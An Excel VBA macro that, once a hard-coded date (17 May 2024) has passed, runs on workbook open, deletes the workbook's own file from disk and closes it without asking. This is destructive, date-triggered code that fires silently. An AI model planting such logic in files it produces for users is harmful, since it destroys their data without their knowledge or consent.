Private Sub Workbook_Open()
    ' Check if the current date is later than a specific date
    If Now() > #5/17/2024# Then
        Call SelfDestruct
    End If
End Sub

Sub SelfDestruct()
    With ThisWorkbook
        .Saved = True ' Prevents the save dialog from appearing
        .ChangeFileAccess xlReadOnly ' Change file access to read-only
        Kill .FullName ' Delete the file
        .Close False ' Close the workbook without saving
    End With
End Sub
